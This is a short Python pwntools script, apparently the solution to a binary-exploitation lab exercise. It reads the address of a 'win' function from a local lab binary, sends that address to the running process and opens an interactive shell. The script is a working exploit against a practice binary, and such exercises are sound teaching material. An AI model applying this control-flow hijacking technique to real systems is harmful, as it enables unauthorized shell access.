import pwn

if __name__ == "__main__":
    
    # I examined the victim binary with Ghidra.
    # I found that the "win:" function allows an attacker to drop into a shell.
    # To use this, I need to pass the decimal version of the function address to the process.
    # This block obtains the address in decimal and converts it to bytes.
    victim_binary_as_assembly = pwn.ELF("./lab1-2.bin")
    win_function_address_as_int_decimal = victim_binary_as_assembly.symbols["win"]
    win_function_address_as_string = str(win_function_address_as_int_decimal)
    win_fuction_address_as_bytes = win_function_address_as_string.encode()
    
    # I can now run the process and provide the necessary address to get a shell.
    victim_binary_as_process = pwn.process("./lab1-2.bin")
    victim_binary_as_process.readline()
    victim_binary_as_process.send(win_fuction_address_as_bytes)
    victim_binary_as_process.interactive()

